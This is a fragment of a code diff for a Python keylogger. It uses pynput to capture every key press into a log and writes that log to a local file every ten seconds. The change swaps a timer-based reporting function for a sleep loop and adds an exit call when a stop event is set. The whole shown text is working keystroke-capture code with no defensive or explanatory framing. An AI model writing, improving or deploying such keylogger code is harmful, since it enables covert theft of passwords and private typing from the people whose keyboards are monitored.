@@ -4,6 +4,7 @@ from termcolor import colored
 import os, sys
 import pynput.keyboard as kb
 import threading
+from time import sleep
 
 log = ""
 try:
@@ -29,20 +30,13 @@ def proc_Keys(key):
 def report(stop_key):
 	
 	global log, path, key_listener
-	file = open(path, "a")
-	file.write(log)
-	
-	log = ""
-	file.close()
-	
-	timer = threading.Timer(10, report, args=(stop_key,))
-
-	if stop_key.is_set():
-		timer.cancel()
-		key_listener.stop()
-		return
-	timer.start()
-		
+	while not stop_key.is_set():
+		file = open(path, "a")
+		file.write(log)
+		log = ""
+		file.close()	
+		sleep(10)
+	key_listener.stop()
 
 key_listener = kb.Listener(on_press=proc_Keys)
 
@@ -59,7 +53,7 @@ key_listener = kb.Listener(on_press=proc_Keys)
 # THUS KILLING THE THREAD CREATED FROM THE PARENT FUNCTION
 def startKL(stop_key):
 	global key_listener
-	
 	with key_listener:
 		report(stop_key)
 		key_listener.join()
+	sys.exit()
